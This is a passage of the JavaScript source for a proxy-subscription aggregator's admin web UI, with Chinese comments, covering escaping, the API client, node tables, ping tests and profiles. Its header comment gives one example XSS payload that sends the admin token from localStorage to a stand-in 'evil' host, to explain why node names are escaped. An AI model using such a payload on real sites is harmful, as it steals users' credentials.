/**
 * subagg Web 管理界面。
 *
 * 零构建：原生 ES module，浏览器直接加载。没有框架，渲染方式是
 * "拼字符串 → innerHTML"，事件用委托。这个规模（四个标签页、若干表单）
 * 撑得住，也让贡献者不必先理解一套构建链才能改一个按钮。
 *
 * ## 两条必须守住的规则
 *
 * 1. **所有外部数据都要转义。** 节点名来自上游订阅，是完全不可信的输入。
 *    一个机场（或者劫持了机场响应的中间人）只要把节点命名成
 *    `<img src=x onerror=fetch('//evil/'+localStorage.getItem('subagg.token'))>`，
 *    不转义就等于把管理 Token 拱手送出。见 `esc()`。
 *
 * 2. **不用内联 onclick。** 本文件是 ES module，函数不在全局作用域，
 *    内联事件处理器根本调用不到。统一走事件委托 + `data-action`。
 */

// ─────────────────────────────────────────────────────────────
//  基础工具
// ─────────────────────────────────────────────────────────────

/**
 * HTML 转义。**渲染任何来自服务端或用户的字符串前都必须调用。**
 * 详见文件头部规则 1。
 */
function esc(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/** 字节数格式化。用 1000 进制而不是 1024 —— 与机场后台的显示口径一致。 */
function fmtBytes(bytes) {
  if (bytes === null || bytes === undefined) return '—';
  if (bytes >= 1e12) return `${(bytes / 1e12).toFixed(2)} TB`;
  if (bytes >= 1e9) return `${(bytes / 1e9).toFixed(2)} GB`;
  if (bytes >= 1e6) return `${(bytes / 1e6).toFixed(1)} MB`;
  if (bytes >= 1e3) return `${Math.round(bytes / 1e3)} KB`;
  return `${bytes} B`;
}

function fmtTime(ts) {
  if (!ts) return '从未';
  const d = new Date(ts);
  const pad = (n) => String(n).padStart(2, '0');
  return `${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
}

function fmtDate(ts) {
  if (!ts) return '—';
  return new Date(ts).toLocaleDateString('zh-CN', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
  });
}

/** Token expiry uses milliseconds; airportExpireHtml below uses Unix seconds. */
function tokenExpiryHtml(expiresAt) {
  if (expiresAt === null || expiresAt === undefined) return '<span class="exp-ok">永不过期</span>';
  const left = expiresAt - Date.now();
  if (left < 0) return '<span class="exp-bad">已过期</span>';
  const days = Math.ceil(left / 86400000);
  return `<span class="exp-${days <= 7 ? 'warn' : 'ok'}">${days} 天后到期</span>`;
}

function tokenQuotaHtml(token) {
  if (token.maxAccess === null || token.maxAccess === undefined) return '<span class="exp-ok">次数不限</span>';
  const used = token.accessCount ?? 0;
  const pct = Math.min(100, (used / token.maxAccess) * 100);
  const level = pct >= 90 ? 'bad' : pct >= 70 ? 'warn' : 'ok';
  const window = token.quotaWindowHours ? ` / ${token.quotaWindowHours}h` : ' / 累计';
  return `<span>${used}/${token.maxAccess}${window}</span><div class="pbar"><div class="pfill f-${level}" style="width:${pct.toFixed(1)}%"></div></div>`;
}

function avatarTextColor(hex) {
  const rgb = hex.slice(1).match(/.{2}/g)?.map((part) => Number.parseInt(part, 16)) ?? [99, 102, 241];
  const luminance = (0.299 * rgb[0] + 0.587 * rgb[1] + 0.114 * rgb[2]) / 255;
  return luminance > 0.62 ? '#1f2328' : '#fff';
}

/**
 * 由地区码推导出稳定的色相。
 *
 * 原型里的地区色标是硬编码的七个 CSS 类（.r-HK ~ .r-UK），出现第八个地区
 * 就没有样式。这里改成哈希：任意地区码都能得到一个确定且互相区分的色相，
 * 而且同一个地区在任何时候、任何页面上颜色都一致。
 */
function regionHue(code) {
  let hash = 0;
  for (let i = 0; i < code.length; i++) {
    hash = (hash * 31 + code.charCodeAt(i)) >>> 0;
  }
  // 黄金角步进让相邻的地区码也能拉开色相距离
  return (hash * 137) % 360;
}

function regionTag(code, label) {
  if (!code) return '<span class="rtag unknown">未知</span>';
  return `<span class="rtag" style="--region-hue:${regionHue(code)}">${esc(label || code)}</span>`;
}

/** 由 ISO 地区码生成旗帜 emoji（与后端 region.ts 的实现一致）。 */
function regionFlag(code) {
  if (!code || code.length !== 2) return '';
  const base = 0x1f1e6;
  return String.fromCodePoint(
    base + (code.toUpperCase().charCodeAt(0) - 65),
    base + (code.toUpperCase().charCodeAt(1) - 65),
  );
}

function toast(message, kind = 'ok') {
  const el = document.createElement('div');
  el.className = `toast ${kind}`;
  el.textContent = message;
  document.getElementById('toasts').appendChild(el);
  setTimeout(() => el.remove(), kind === 'error' ? 6000 : 3200);
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast('已复制到剪贴板');
  } catch {
    // clipboard API 在非 HTTPS 环境下不可用（本地 http 访问时很常见）。
    // 与其静默失败，不如告诉用户手动复制。
    toast('浏览器拒绝了剪贴板访问，请手动选中复制', 'warn');
  }
}

// ─────────────────────────────────────────────────────────────
//  API
// ─────────────────────────────────────────────────────────────

const TOKEN_KEY = 'subagg.admin_token';
const THEME_KEY = 'subagg.theme';

function applyTheme(theme) {
  if (theme === 'dark') document.documentElement.dataset.theme = 'dark';
  else delete document.documentElement.dataset.theme;
  try { localStorage.setItem(THEME_KEY, theme === 'dark' ? 'dark' : 'light'); } catch { /* ignore */ }
}

const api = {
  token: localStorage.getItem(TOKEN_KEY) || '',

  setToken(value) {
    this.token = value;
    localStorage.setItem(TOKEN_KEY, value);
  },

  clearToken() {
    this.token = '';
    localStorage.removeItem(TOKEN_KEY);
  },

  async request(method, path, body) {
    const res = await fetch(`/api${path}`, {
      method,
      headers: {
        Authorization: `Bearer ${this.token}`,
        ...(body ? { 'Content-Type': 'application/json' } : {}),
      },
      ...(body ? { body: JSON.stringify(body) } : {}),
    });

    if (res.status === 401) {
      // Token 失效（改过 ADMIN_TOKEN，或从别处复制了错的）。
      // 退回登录门，而不是让后续每个请求都无声失败。
      showGate('管理 Token 无效或已变更，请重新输入');
      throw new Error('未授权');
    }

    if (res.status === 204) return null;

    const payload = await res.json().catch(() => null);
    if (!res.ok) {
      const detail = payload?.details?.join('；');
      throw new Error(detail || payload?.error || `HTTP ${res.status}`);
    }
    return payload;
  },

  get: (path) => api.request('GET', path),
  post: (path, body) => api.request('POST', path, body),
  patch: (path, body) => api.request('PATCH', path, body),
  del: (path) => api.request('DELETE', path),
};

// ─────────────────────────────────────────────────────────────
//  状态
// ─────────────────────────────────────────────────────────────

const state = {
  meta: null,
  subscriptions: [],
  profiles: [],
  friends: [],
  tokens: [],
  nodes: [],
  totals: {},

  // 节点页的筛选
  selRegions: new Set(),
  selTypes: new Set(),
  sourceFilter: '',
  statusFilter: '',
  query: '',
  focusedSub: null,
  nodeSort: 'default',
  nodePage: 1,
  nodePageSize: 100,
  pingResults: new Map(),
  pingHistory: new Map(),
  pingRun: null,
  selectedNodeFp: null,

  // 节点页的勾选（用于"从选中节点新建配置"）
  picked: new Set(),
};

// ─────────────────────────────────────────────────────────────
//  数据加载
// ─────────────────────────────────────────────────────────────

async function loadAll() {
  const [meta, appState, nodes] = await Promise.all([
    api.get('/meta'),
    api.get('/state'),
    api.get('/nodes'),
  ]);

  state.meta = meta;
  state.subscriptions = appState.subscriptions;
  state.profiles = appState.profiles;
  state.friends = appState.friends;
  state.tokens = appState.tokens;
  state.totals = appState.totals;
  state.nodes = nodes;
  const currentFingerprints = new Set(nodes.map((node) => node.fingerprint));
  const persistedPings = new Map(
    nodes.filter((node) => node.ping).map((node) => [node.fingerprint, node.ping]),
  );
  const currentPings = [...state.pingResults].filter(([fingerprint]) => currentFingerprints.has(fingerprint));
  state.pingResults = new Map([...persistedPings, ...currentPings]);

  renderAll();
}

function renderAll() {
  renderSidebar();
  renderFilters();
  renderNodeStats();
  applyFilter();
  renderProfiles();
  renderTraffic();
  renderFriends();
  renderSettings();

  document.getElementById('profileCnt').textContent = state.profiles.length;
  document.getElementById('friendCnt').textContent = state.friends.length;

  const lastSync = state.subscriptions
    .map((s) => s.lastSyncAt)
    .filter(Boolean)
    .sort((a, b) => b - a)[0];
  document.getElementById('lastSync').textContent = lastSync
    ? `上次同步 ${fmtTime(lastSync)}`
    : '尚未同步';
}

// ─────────────────────────────────────────────────────────────
//  侧栏
// ─────────────────────────────────────────────────────────────

function renderSidebar() {
  const list = document.getElementById('subList');
  if (!list) return;

  if (state.subscriptions.length === 0) {
    list.innerHTML = `<div class="empty" style="padding:24px 12px">
      还没有订阅源<br><b>点击上方「+ 添加」开始</b>
    </div>`;
  } else {
    list.innerHTML = state.subscriptions
      .map((sub) => {
        const t = sub.traffic;
        const used = t ? t.upload + t.download : 0;
        const hasQuota = t && t.total;
        const pct = hasQuota ? Math.min(100, (used / t.total) * 100) : 0;
        const remaining = hasQuota ? t.total - used : null;

        const classes = ['sub-item'];
        if (state.focusedSub === sub.id) classes.push('active');
        if (sub.lastError) classes.push('errored');
        if (!sub.enabled) classes.push('disabled');

        return `
        <div class="${classes.join(' ')}" data-action="focus-sub" data-id="${esc(sub.id)}">
          <div class="sub-actions">
            <button class="icobtn" data-action="sync-sub" data-id="${esc(sub.id)}" title="同步">⟳</button>
            <button class="icobtn" data-action="edit-sub" data-id="${esc(sub.id)}" title="编辑">✎</button>
          </div>
          <div class="sub-name">${esc(sub.name)}</div>
          <div class="sub-meta">
            <span class="sub-nc">${sub.nodeCount} 节点</span>
            <div class="sub-bar">
              <div class="sub-fill${pct > 80 ? ' danger' : ''}" style="width:${pct.toFixed(1)}%"></div>
            </div>
            <span class="sub-rem">${hasQuota ? fmtBytes(remaining) : '不限量'}</span>
          </div>
          ${sub.lastError ? `<div class="sub-err" title="${esc(sub.lastError)}">⚠ ${esc(sub.lastError)}</div>` : ''}
        </div>`;
      })
      .join('');
  }

  const totalUsed = state.subscriptions.reduce(
    (sum, s) => sum + (s.traffic ? s.traffic.upload + s.traffic.download : 0),
    0,
  );
  const totalQuota = state.subscriptions.reduce(
    (sum, s) => sum + (s.traffic?.total || 0),
    0,
  );

  const totals = document.getElementById('totGrid');
  if (!totals) return;
  totals.innerHTML = `
    <div class="tot-cell"><div class="tot-lbl">订阅数</div><div class="tot-val">${state.totals.subscriptions ?? 0}</div></div>
    <div class="tot-cell"><div class="tot-lbl">节点数</div><div class="tot-val">${state.totals.nodes ?? 0}</div></div>
    <div class="tot-cell"><div class="tot-lbl">已用流量</div><div class="tot-val">${fmtBytes(totalUsed)}</div></div>
    <div class="tot-cell"><div class="tot-lbl">总配额</div><div class="tot-val">${totalQuota ? fmtBytes(totalQuota) : '—'}</div></div>`;
}

function renderSettings() {
  const grid = document.getElementById('settingsGrid');
  if (!grid) return;
  const dark = document.documentElement.dataset.theme === 'dark';
  const targetCount = state.meta?.targets?.length ?? 0;
  grid.innerHTML = `
    <section class="settings-card"><div class="settings-card-head"><div><div class="settings-kicker">SERVICE</div><h2>服务状态</h2></div><span class="status-pill online"><i></i>已连接</span></div><dl class="settings-list"><dt>节点总数</dt><dd>${state.totals.nodes ?? 0}</dd><dt>订阅源</dt><dd>${state.totals.subscriptions ?? 0}</dd><dt>配置文件</dt><dd>${state.totals.profiles ?? 0}</dd><dt>可输出格式</dt><dd>${targetCount} 种</dd></dl><button class="btn-sec" data-action="side-sync">↻ 立即同步订阅</button></section>
    <section class="settings-card"><div class="settings-card-head"><div><div class="settings-kicker">APPEARANCE</div><h2>界面外观</h2></div></div><p class="settings-copy">主题仅保存在当前浏览器，可随时切换。</p><div class="theme-options"><button class="theme-option${dark ? '' : ' active'}" data-action="set-theme" data-theme="light"><span>☼</span><b>浅色</b><small>适合白天使用</small></button><button class="theme-option${dark ? ' active' : ''}" data-action="set-theme" data-theme="dark"><span>◐</span><b>深色</b><small>适合弱光环境</small></button></div></section>
    <section class="settings-card settings-card-wide"><div class="settings-card-head"><div><div class="settings-kicker">SAFETY</div><h2>管理访问</h2></div></div><p class="settings-copy">管理凭据只保存在当前浏览器。退出会立即清除本机保存的凭据，不会影响已生成的订阅链接。</p><button class="btn-danger" data-action="logout-from-settings">退出管理台</button></section>`;
}

// ─────────────────────────────────────────────────────────────
//  节点页
// ─────────────────────────────────────────────────────────────

function renderFilters() {
  const regions = [...new Set(state.nodes.map((node) => node.region).filter(Boolean))].sort();
  const types = [...new Set(state.nodes.map((node) => node.type))].sort();
  const sources = [...new Map(state.nodes.map((node) => [node.sourceId, node.sourceName])).entries()]
    .sort(([, left], [, right]) => left.localeCompare(right, 'zh-Hans-CN'));
  const sourceSelect = document.getElementById('nodeSourceFilter');
  const regionSelect = document.getElementById('nodeRegionFilter');
  const typeSelect = document.getElementById('nodeTypeFilter');
  if (sourceSelect) sourceSelect.innerHTML = '<option value="">全部来源</option>' + sources.map(([id, name]) => `<option value="${esc(id)}"${state.sourceFilter === id ? ' selected' : ''}>${esc(name)}</option>`).join('');
  if (regionSelect) regionSelect.innerHTML = '<option value="">全部地区</option>' + regions.map((region) => `<option value="${esc(region)}"${state.selRegions.has(region) ? ' selected' : ''}>${regionFlag(region)} ${esc(region)}</option>`).join('');
  if (typeSelect) typeSelect.innerHTML = '<option value="">全部协议</option>' + types.map((type) => `<option value="${esc(type)}"${state.selTypes.has(type) ? ' selected' : ''}>${esc(type.toUpperCase())}</option>`).join('');
}

function renderNodeStats() {
  const el = document.getElementById('nodeStats');
  if (!el) return;
  const typeCounts = new Map();
  state.nodes.forEach((node) => typeCounts.set(node.type, (typeCounts.get(node.type) ?? 0) + 1));
  const online = [...state.pingResults.values()].filter((result) => result.ok).length;
  const offline = [...state.pingResults.values()].filter((result) => !result.ok).length;
  const tested = Math.min(state.nodes.length, state.pingResults.size);
  const progress = state.pingRun;
  const statusNote = progress
    ? `测试中 ${progress.completed}/${progress.total} · 在线 ${progress.online} · 离线 ${progress.offline}`
    : tested
      ? `已测试 ${tested}/${state.nodes.length} · 在线 ${online} · 离线 ${offline}`
      : '尚未测试';
  const cards = [
    ['总节点数', state.nodes.length, statusNote, 'stack'],
    ['VLESS 节点', typeCounts.get('vless') ?? 0, state.nodes.length ? `${((typeCounts.get('vless') ?? 0) / state.nodes.length * 100).toFixed(1)}%` : '0%', 'vless'],
    ['VMESS 节点', typeCounts.get('vmess') ?? 0, state.nodes.length ? `${((typeCounts.get('vmess') ?? 0) / state.nodes.length * 100).toFixed(1)}%` : '0%', 'vmess'],
    ['Trojan 节点', typeCounts.get('trojan') ?? 0, state.nodes.length ? `${((typeCounts.get('trojan') ?? 0) / state.nodes.length * 100).toFixed(1)}%` : '0%', 'trojan'],
    ['Shadowsocks 节点', (typeCounts.get('ss') ?? 0) + (typeCounts.get('ssr') ?? 0), state.nodes.length ? `${(((typeCounts.get('ss') ?? 0) + (typeCounts.get('ssr') ?? 0)) / state.nodes.length * 100).toFixed(1)}%` : '0%', 'ss'],
    ['其他协议', state.nodes.length - ['vless', 'vmess', 'trojan', 'ss', 'ssr'].reduce((sum, type) => sum + (typeCounts.get(type) ?? 0), 0), '混合协议', 'other'],
  ];
  el.innerHTML = cards.map(([label, value, note, tone]) => `<div class="node-stat-card tone-${tone}"><span class="node-stat-icon">${tone === 'stack' ? '▱' : tone === 'vless' ? '➤' : tone === 'vmess' ? '♢' : tone === 'trojan' ? '♙' : tone === 'ss' ? 'ϟ' : '•••'}</span><div><span class="node-stat-label">${label}</span><strong>${value}</strong><small>${note}</small></div></div>`).join('');
}

function filteredNodes() {
  const q = state.query.toLowerCase();
  return state.nodes.filter((n) => {
    if (state.focusedSub && n.sourceId !== state.focusedSub) return false;
    if (state.sourceFilter && n.sourceId !== state.sourceFilter) return false;
    if (state.selRegions.size && !state.selRegions.has(n.region)) return false;
    if (state.selTypes.size && !state.selTypes.has(n.type)) return false;
    if (state.statusFilter) {
      const result = state.pingResults.get(n.fingerprint);
      const status = result ? result.ok ? 'online' : 'offline' : 'unknown';
      if (status !== state.statusFilter) return false;
    }
    if (q && !n.name.toLowerCase().includes(q) && !n.server.toLowerCase().includes(q)) return false;
    return true;
  });
}

function applyFilter() {
  const nodes = filteredNodes();
  renderNodes(nodes);

  const nodeCount = document.getElementById('nodeCnt');
  if (nodeCount) nodeCount.textContent = nodes.length;

  const filtering =
    state.selRegions.size || state.selTypes.size || state.sourceFilter || state.statusFilter || state.query || state.focusedSub;
  const pickedNote = state.picked.size ? ` · 已勾选 ${state.picked.size}` : '';
  const summary = document.getElementById('fsumm');
  if (summary) summary.textContent =
    (filtering ? `已筛选 ${nodes.length} / ${state.nodes.length}` : `共 ${state.nodes.length} 个节点`) +
    pickedNote;
}

function renderNodes(nodes) {
  const body = document.getElementById('nodeBody');
  if (!body) return;

  if (state.nodes.length === 0) {
    body.innerHTML = `<tr><td colspan="10"><div class="empty">
      还没有任何节点<br><b>先在左侧添加一个订阅源</b>
    </div></td></tr>`;
    renderNodePagination(0);
    return;
  }

  if (nodes.length === 0) {
    body.innerHTML = `<tr><td colspan="10"><div class="empty">没有匹配的节点</div></td></tr>`;
    renderNodePagination(0);
    return;
  }

  const sortedNodes = [...nodes].sort((a, b) => {
    if (state.nodeSort === 'name') return a.name.localeCompare(b.name, 'zh-Hans-CN', { numeric: true });
    if (state.nodeSort === 'port') return a.port - b.port || a.name.localeCompare(b.name);
    if (state.nodeSort === 'status' || state.nodeSort === 'latency') {
      const left = state.pingResults.get(a.fingerprint);
      const right = state.pingResults.get(b.fingerprint);
      const rank = (result) => result ? (result.ok ? 0 : 1) : 2;
      if (state.nodeSort === 'status' && rank(left) !== rank(right)) return rank(left) - rank(right);
      const leftLatency = left?.ok ? left.latencyMs : Number.POSITIVE_INFINITY;
      const rightLatency = right?.ok ? right.latencyMs : Number.POSITIVE_INFINITY;
      if (leftLatency !== rightLatency) return leftLatency - rightLatency;
      return a.name.localeCompare(b.name, 'zh-Hans-CN', { numeric: true });
    }
    return 0;
  });

  const pageCount = Math.max(1, Math.ceil(sortedNodes.length / state.nodePageSize));
  state.nodePage = Math.min(Math.max(1, state.nodePage), pageCount);
  const pageStart = (state.nodePage - 1) * state.nodePageSize;
  const pageNodes = sortedNodes.slice(pageStart, pageStart + state.nodePageSize);
  const rows = pageNodes.map((node) => {
    const ping = state.pingResults.get(node.fingerprint);
    const status = ping ? ping.ok ? 'online' : 'offline' : 'unknown';
    const statusLabel = status === 'online' ? '在线' : status === 'offline' ? '离线' : '未测试';
    const latency = ping?.ok ? `${ping.latencyMs ?? 0}ms` : '—';
    return `<tr class="${state.selectedNodeFp === node.fingerprint ? 'selected' : ''}" data-action="select-node" data-fp="${esc(node.fingerprint)}">
      <td class="pick-cell"><input type="checkbox" data-action="pick-node" data-fp="${esc(node.fingerprint)}" ${state.picked.has(node.fingerprint) ? 'checked' : ''}></td>
      <td><span class="nname">${regionFlag(node.region)} ${esc(node.name)}</span><small class="node-fingerprint">${esc(node.fingerprint)}</small></td>
      <td><span class="nbadge t-${esc(node.type)}">${esc(node.type.toUpperCase())}</span></td>
      <td>${regionTag(node.region, node.region)}</td>
      <td class="nmono">${esc(node.server)}</td>
      <td class="port-cell">${node.port}</td>
      <td class="latency-cell ${status === 'online' ? 'is-online' : ''}">${latency}</td>
      <td><span class="status-pill ${status}"><i></i>${statusLabel}</span></td>
      <td class="nsrc">${esc(node.sourceName)}</td>
      <td class="row-actions"><button class="icon-action" data-action="ping-node" data-fp="${esc(node.fingerprint)}" title="测试 TCP 连通性">ϟ</button><button class="icon-action" data-action="copy-node" data-fp="${esc(node.fingerprint)}" title="复制 URI">↗</button><button class="icon-action" data-action="select-node" data-fp="${esc(node.fingerprint)}" title="查看详情">⋮</button></td>
    </tr>`;
  }).join('');

  // 勾选了节点时，在表格顶部插一条操作栏 —— 这是"生成选择"的入口
  const actionBar = state.picked.size
    ? `<tr><td colspan="10" style="background:var(--adim)">
        <div style="display:flex;align-items:center;gap:10px">
          <span>已勾选 <b>${state.picked.size}</b> 个节点</span>
          <button class="mini-btn" data-action="profile-from-picked">用它们新建配置文件</button>
          <button class="mini-btn" data-action="clear-picked">清空勾选</button>
        </div>
      </td></tr>`
    : '';

  body.innerHTML = actionBar + rows;
  renderNodePagination(sortedNodes.length, pageCount, pageStart, pageNodes.length);
}

function renderNodePagination(total, pageCount = 1, pageStart = 0, pageLength = 0) {
  const foot = document.getElementById('nodeFootCount');
  if (foot) foot.textContent = total ? `显示 ${pageStart + 1}-${pageStart + pageLength}，共 ${total} 条` : '显示 0 条';

  const pagination = document.getElementById('nodePagination');
  if (!pagination) return;
  if (!total) {
    pagination.innerHTML = '';
    return;
  }

  const windowStart = Math.max(1, Math.min(state.nodePage - 2, pageCount - 4));
  const windowEnd = Math.min(pageCount, windowStart + 4);
  const pages = Array.from({ length: windowEnd - windowStart + 1 }, (_, index) => windowStart + index)
    .map((page) => `<button class="${page === state.nodePage ? 'current' : ''}" data-action="node-page" data-page="${page}">${page}</button>`)
    .join('');
  pagination.innerHTML = `
    <button data-action="node-page" data-page="${state.nodePage - 1}" ${state.nodePage === 1 ? 'disabled' : ''}>‹</button>
    ${pages}
    <button data-action="node-page" data-page="${state.nodePage + 1}" ${state.nodePage === pageCount ? 'disabled' : ''}>›</button>
    <select id="nodePageSize" aria-label="每页条数">
      ${[50, 100, 200].map((size) => `<option value="${size}"${size === state.nodePageSize ? ' selected' : ''}>${size} 条/页</option>`).join('')}
    </select>`;
}

function latencyHistoryHtml(payload) {
  const snapshots = payload?.snapshots ?? [];
  const successful = snapshots.filter((snapshot) => snapshot.ok && typeof snapshot.latencyMs === 'number');
  const failed = snapshots.length - successful.length;
  if (!snapshots.length) {
    return '<div class="latency-history-empty">暂无历史数据。自动测试会在首次测试后开始积累。</div>';
  }
  if (!successful.length) {
    return `<div class="latency-history-empty">最近 ${snapshots.length} 次测试均未连通，暂无可绘制的延迟曲线。</div>`;
  }

  const values = successful.map((snapshot) => snapshot.latencyMs);
  const min = Math.min(...values);
  const max = Math.max(...values);
  const average = Math.round(values.reduce((sum, value) => sum + value, 0) / values.length);
  const width = 640;
  const height = 132;
  const pad = 18;
  const span = Math.max(1, max - min);
  const points = successful.map((snapshot, index) => {
    const x = successful.length === 1 ? width / 2 : pad + index * ((width - pad * 2) / (successful.length - 1));
    const y = height - pad - ((snapshot.latencyMs - min) / span) * (height - pad * 2);
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(' ');
  const started = fmtDate(snapshots[0]?.checkedAt);
  const ended = fmtDate(snapshots[snapshots.length - 1]?.checkedAt);

  return `<div class="latency-history-summary"><span>平均 <b>${average}ms</b></span><span>范围 ${min}-${max}ms</span><span>${failed ? `失败 ${failed} 次` : '全部连通'}</span></div><svg class="latency-chart" viewBox="0 0 ${width} ${height}" role="img" aria-label="节点延迟历史趋势"><line x1="${pad}" y1="${pad}" x2="${width - pad}" y2="${pad}"/><line x1="${pad}" y1="${height / 2}" x2="${width - pad}" y2="${height / 2}"/><line x1="${pad}" y1="${height - pad}" x2="${width - pad}" y2="${height - pad}"/><polyline points="${points}"/></svg><div class="latency-chart-labels"><span>${started}</span><span>${ended}</span></div>`;
}

async function loadLatencyHistory(fingerprint) {
  const target = document.getElementById('nodeLatencyHistory');
  if (!target || target.dataset.fingerprint !== fingerprint) return;
  try {
    const payload = await api.get(`/nodes/${encodeURIComponent(fingerprint)}/ping/history`);
    state.pingHistory.set(fingerprint, payload);
    const current = document.getElementById('nodeLatencyHistory');
    if (current?.dataset.fingerprint === fingerprint) current.innerHTML = latencyHistoryHtml(payload);
  } catch (err) {
    const current = document.getElementById('nodeLatencyHistory');
    if (current?.dataset.fingerprint === fingerprint) current.innerHTML = `<div class="latency-history-empty">历史读取失败：${esc(err.message)}</div>`;
  }
}

function openNodeDetail(node) {
  if (!node) return;
  const ping = state.pingResults.get(node.fingerprint);
  const status = ping ? ping.ok ? 'online' : 'offline' : 'unknown';
  const statusLabel = status === 'online' ? '在线' : status === 'offline' ? '离线' : '未测试';
  openModal(`
    <div class="node-modal-head"><div><div class="detail-kicker">NODE DETAIL</div><h2>${regionFlag(node.region)} ${esc(node.name)}</h2><p>${esc(node.sourceName)} · ${esc(node.type.toUpperCase())}</p></div><button class="node-modal-close" data-action="close-modal" aria-label="关闭节点详情">×</button></div>
    <div class="node-modal-actions"><span class="status-pill ${status}"><i></i>${statusLabel}</span><button class="btn-sec" data-action="ping-node" data-fp="${esc(node.fingerprint)}">ϟ 测试连接</button><button class="btn-sec" data-action="copy-node" data-fp="${esc(node.fingerprint)}">↗ 复制 URI</button></div>
    <div class="node-detail-grid"><div><span>地区</span><strong>${regionTag(node.region, node.region)}</strong></div><div><span>服务器</span><strong class="detail-code">${esc(node.server)}</strong></div><div><span>端口</span><strong>${node.port}</strong></div><div><span>TCP 延迟</span><strong class="${status === 'online' ? 'metric-ok' : ''}">${ping?.ok ? `${ping.latencyMs ?? 0}ms` : '—'}</strong></div><div><span>最近测试</span><strong>${ping ? fmtTime(ping.checkedAt) : '尚未测试'}</strong></div><div><span>节点指纹</span><strong class="detail-code">${esc(node.fingerprint)}</strong></div></div>
    <section class="latency-history"><div class="latency-history-head"><div><div class="detail-kicker">LATENCY HISTORY</div><h3>延迟趋势</h3></div><span>每 ${state.meta?.nodePingIntervalHours ?? 12} 小时自动测试</span></div><div id="nodeLatencyHistory" data-fingerprint="${esc(node.fingerprint)}"><div class="latency-history-empty">正在读取最近 90 天数据…</div></div></section>
    <p class="node-modal-note">测试只建立 TCP 连接，不发送代理凭据；结果不表示代理认证成功。历史保留最近 90 天。</p>`, true, 'node-detail-modal');
  void loadLatencyHistory(node.fingerprint);
}

function rememberPingResult(result) {
  state.pingResults.set(result.fingerprint, { ...result, checkedAt: Date.now() });
  renderNodeStats();
  applyFilter();
}

async function pingNode(fingerprint) {
  const result = await api.get(`/nodes/${encodeURIComponent(fingerprint)}/ping`);
  rememberPingResult(result);
  return result;
}

async function pingAllNodes() {
  if (state.pingRun) return;
  const targets = [...state.nodes];
  if (!targets.length) {
    toast('没有可测试的节点', 'warn');
    return;
  }

  const button = document.getElementById('pingAllBtn');
  state.pingRun = { total: targets.length, completed: 0, online: 0, offline: 0 };
  if (button) {
    button.disabled = true;
    button.textContent = `ϟ 测试中 0/${targets.length}`;
  }
  renderNodeStats();

  let nextIndex = 0;
  const workers = Array.from({ length: Math.min(8, targets.length) }, async () => {
    while (nextIndex < targets.length) {
      const node = targets[nextIndex++];
      try {
        const result = await pingNode(node.fingerprint);
        if (result.ok) state.pingRun.online += 1;
        else state.pingRun.offline += 1;
      } catch (err) {
        state.pingRun.offline += 1;
        rememberPingResult({
          fingerprint: node.fingerprint,
          name: node.name,
          ok: false,
          latencyMs: null,
          error: err instanceof Error ? err.message : String(err),
        });
      } finally {
        state.pingRun.completed += 1;
        if (button) button.textContent = `ϟ 测试中 ${state.pingRun.completed}/${state.pingRun.total}`;
        renderNodeStats();
      }
    }
  });

  try {
    await Promise.all(workers);
    toast(`全部测试完成：在线 ${state.pingRun.online}，离线 ${state.pingRun.offline}`, state.pingRun.offline ? 'warn' : 'ok');
  } finally {
    state.pingRun = null;
    if (button) {
      button.disabled = false;
      button.textContent = 'ϟ 测试全部节点';
    }
    renderNodeStats();
    applyFilter();
  }
}

// ─────────────────────────────────────────────────────────────
//  配置文件页
// ─────────────────────────────────────────────────────────────

/** 把规则摘要成几个标签，让人一眼看出这个配置选了什么。 */
function ruleTags(rule) {
  const tags = [];
  if (rule.pick?.length) tags.push(`手动勾选 ${rule.pick.length} 个`);
  if (rule.regions?.length) tags.push(...rule.regions.map((r) => `${regionFlag(r)} ${r}`));
  if (rule.types?.length) tags.push(...rule.types.map((t) => t.toUpperCase()));
  if (rule.include?.length) tags.push(`包含规则 ×${rule.include.length}`);
  if (rule.exclude?.length) tags.push(`排除规则 ×${rule.exclude.length}`);
  if (rule.dedupe && rule.dedupe !== 'off') tags.push('已去重');
  if (rule.limit) tags.push(`上限 ${rule.limit}`);
  if (rule.chain?.enabled) {
    const e = rule.chain.entry?.pick?.length ?? 0;
    const l = rule.chain.landing?.pick?.length ?? 0;
    tags.push(`链式 ${e}×${l}`);
  }
  if (tags.length === 0) tags.push('全部节点');
  return tags;
}

function renderProfiles() {
  const grid = document.getElementById('profileGrid');
  if (!grid) return;

  if (state.profiles.length === 0) {
    grid.innerHTML = `<div class="empty" style="grid-column:1/-1">
      还没有配置文件<br>
      <b>配置文件 = 一组过滤规则 + 一个默认输出格式</b><br>
      生成的链接可以直接导入 Clash / Shadowrocket / v2rayN
    </div>`;
    return;
  }

  grid.innerHTML = state.profiles
    .map((p) => {
      const activeTokens = state.tokens.filter((t) => t.profileId === p.id && !t.revoked);
      const targetLabel =
        state.meta?.targets.find((t) => t.value === p.defaultTarget)?.label ?? p.defaultTarget;

      return `
      <div class="pcard">
        <div class="pcard-head">
          <div class="picon">${esc(p.icon)}</div>
          <div style="flex:1;min-width:0">
            <div class="pinfo-name">${esc(p.name)}</div>
            <div class="pinfo-desc">${esc(p.description || '（无描述）')}</div>
          </div>
          ${activeTokens.length ? `<span class="shared-badge">${activeTokens.length} 条链接</span>` : ''}
        </div>
        <div class="ptags">
          ${ruleTags(p.rule).map((t) => `<span class="ptag">${esc(t)}</span>`).join('')}
          <span class="ptag accent">${esc(targetLabel)}</span>
        </div>
        <div class="pfoot">
          <span class="pcount">命中 ${p.matchedNodes} 个节点</span>
          <button class="icobtn" data-action="edit-profile" data-id="${esc(p.id)}">编辑规则</button>
          <button class="genbtn" data-action="links" data-id="${esc(p.id)}">订阅链接</button>
        </div>
      </div>`;
    })
    .join('');
}

// ─────────────────────────────────────────────────────────────
//  流量页
// ─────────────────────────────────────────────────────────────

// Airport Subscription-Userinfo expire is Unix seconds, not token milliseconds.
function airportExpireHtml(expireSeconds) {
  if (!expireSeconds) return '<span class="exp-ok">不过期</span>';
  const ms = expireSeconds * 1000;
  const days = Math.floor((ms - Date.now()) / 86400000);
  const str = fmtDate(ms);
